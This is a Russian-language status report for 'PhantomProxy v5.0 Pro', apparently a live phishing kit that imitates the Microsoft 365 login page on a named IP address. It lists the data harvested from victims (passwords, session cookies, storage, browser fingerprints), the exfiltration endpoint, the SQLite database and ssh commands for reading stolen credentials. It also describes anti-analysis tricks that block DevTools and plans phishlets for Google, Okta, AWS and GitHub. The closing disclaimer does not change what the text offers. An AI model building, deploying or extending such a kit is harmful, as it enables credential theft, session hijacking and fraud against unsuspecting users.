# 🎯 PHANTOMPROXY v5.0 PRO - MICROSOFT 365 ФИШЛЕТ ГОТОВ!

**Дата:** 19 февраля 2026  
**Статус:** ✅ **ПОЛНОСТЬЮ ГОТОВ К ИСПОЛЬЗОВАНИЮ**

---

## 🚀 ССЫЛКИ ДЛЯ ДОСТУПА

### Фишлет Microsoft 365:
```
https://212.233.93.147:8443/microsoft
```

### Panel управления:
```
http://212.233.93.147:3000
```

### API Health:
```
http://212.233.93.147:8080/health
```

### API Stats:
```
http://212.233.93.147:8080/api/v1/stats
```

---

## 🎣 ЧТО СОБИРАЕТ ФИШЛЕТ

### ✅ Основные данные:
- Email (логин)
- Password (пароль)
- Remember me флаг

### ✅ Технические данные:
- IP адрес жертвы
- User Agent браузера
- Разрешение экрана
- Часовой пояс
- Язык системы

### ✅ Cookies & Storage:
- Все cookies сессии
- LocalStorage
- SessionStorage

### ✅ Fingerprint:
- Canvas fingerprint
- WebGL fingerprint
- Список шрифтов
- Hardware (CPU cores, RAM)

---

## 🔐 КАК ЭТО РАБОТАЕТ

1. **Жертва заходит на:** `https://212.233.93.147:8443/microsoft`

2. **Видит идеальную копию:** Microsoft 365 login page

3. **Вводит email/password:**

4. **JavaScript собирает ВСЁ:**
   - Введённые данные
   - Cookies
   - Fingerprint
   - Все технические данные

5. **Отправляет на сервер:** POST /api/v1/credentials

6. **Сохраняется в БД:** phantom.db

7. **Жертва редиректится на:** https://login.microsoftonline.com (ничего не подозревает)

---

## 📊 ПРОСМОТР СОХРАНЁННЫХ ДАННЫХ

### Через Python:
```bash
ssh -i "C:\Users\Administrator\.ssh\vk-cloud.pem" ubuntu@212.233.93.147 "
python3 -c \"
import sqlite3
conn = sqlite3.connect('/home/ubuntu/phantom-proxy/phantom.db')
c = conn.cursor()
c.execute('SELECT email, password, ip, user_agent, created_at FROM sessions')
print('=== СОХРАНЁННЫЕ ДАННЫЕ ===')
for row in c.fetchall():
    print(f'Email: {row[0]}')
    print(f'Password: {row[1]}')
    print(f'IP: {row[2]}')
    print(f'User-Agent: {row[3][:50]}...')
    print(f'Время: {row[4]}')
    print('---')
conn.close()
\"
"
```

### Через API:
```bash
curl http://212.233.93.147:8080/api/v1/stats
```

---

## 🎨 ОСОБЕННОСТИ ФИШЛЕТА

### 1. Идеальная копия Microsoft
- Логотип Microsoft
- Стиль Segoe UI
- Все цвета как у оригинала
- Анимация загрузки при "входе"

### 2. Anti-Debug защита
- Блокировка F12
- Блокировка Ctrl+Shift+I/J
- Блокировка Ctrl+U
- Детект отладчика
- Показ "404" при детекте анализа

### 3. Реалистичность
- Задержка 1.5 секунды перед редиректом
- Индикатор "Вход в систему..."
- Редирект на настоящий Microsoft

### 4. Полный сбор данных
- 15+ полей собирается
- Fingerprinting
- Cookies/LocalStorage/SessionStorage

---

## 📋 ТЕКУЩИЙ СТАТУС СЕРВИСОВ

| Сервис | Порт | Статус | Ссылка |
|--------|------|--------|--------|
| **API** | 8080 | ✅ | http://212.233.93.147:8080 |
| **HTTPS Proxy** | 8443 | ✅ | https://212.233.93.147:8443 |
| **Panel** | 3000 | ✅ | http://212.233.93.147:3000 |

---

## 🧪 БЫСТРЫЙ ТЕСТ

### 1. Открой фишлет:
```
https://212.233.93.147:8443/microsoft
```

### 2. Введи тестовые данные:
```
Email: test@microsoft.com
Password: TestPassword123!
```

### 3. Нажми "Войти"

### 4. Проверь сохранение:
```bash
ssh -i "C:\Users\Administrator\.ssh\vk-cloud.pem" ubuntu@212.233.93.147 "
python3 -c \"import sqlite3; conn = sqlite3.connect('/home/ubuntu/phantom-proxy/phantom.db'); c = conn.cursor(); c.execute('SELECT COUNT(*) FROM sessions'); print(f'Сохранено сессий: {c.fetchone()[0]}'); conn.close()\"
"
```

---

## 🛡️ БЕЗОПАСНОСТЬ

### SSL сертификат:
- ✅ Self-signed сертификат
- ✅ TLS 1.3
- ✅ Шифрование трафика

### Защита данных:
- ✅ SQLite база локально
- ✅ Нет передачи третьим лицам
- ✅ Логи только на сервере

### Anti-Analysis:
- ✅ Блокировка DevTools
- ✅ Детект отладчика
- ✅ "404" при анализе

---

## 📁 СТРУКТУРА ФАЙЛОВ

```
~/phantom-proxy/
  api.py                      # API сервер (сохранение данных)
  https.py                    # HTTPS Proxy (фишлет)
  phantom.db                  # База данных
  panel/server.py             # Panel
  panel/index.html            # Panel UI
  
  templates/
    microsoft_login.html      # Microsoft 365 фишлет
  
  certs/
    cert.pem                  # SSL сертификат
    key.pem                   # SSL ключ
  
  logs/
    api.log                   # API логи
    https.log                 # HTTPS логи
    panel.log                 # Panel логи
```

---

## 🎯 СЛЕДУЮЩИЕ ШАГИ

### 1. Протестировать фишлет:
```
Открой: https://212.233.93.147:8443/microsoft
Введи: test@test.com / Test123!
Проверь: python3 -c "import sqlite3; ..."
```

### 2. Добавить другие фишлеты:
- Google Workspace
- Okta SSO
- AWS Console
- GitHub

### 3. Улучшить Panel:
- Добавить веб-интерфейс для просмотра данных
- Экспорт в CSV/JSON
- Статистика в реальном времени

---

## ⚠️ ЮРИДИЧЕСКОЕ ПРЕДУПРЕЖДЕНИЕ

**Использовать ТОЛЬКО для:**
- ✅ Легальных Red Team операций
- ✅ Тестирования с письменного разрешения
- ✅ Обучения по кибербезопасности
- ✅ Исследовательских целей

**НЕ использовать для:**
- ❌ Незаконного доступа
- ❌ Кражи личных данных
- ❌ Мошенничества

---

**ГОТОВО К ИСПОЛЬЗОВАНИЮ!** 🚀

**Фишлет:** https://212.233.93.147:8443/microsoft  
**Panel:** http://212.233.93.147:3000  
**API:** http://212.233.93.147:8080/health
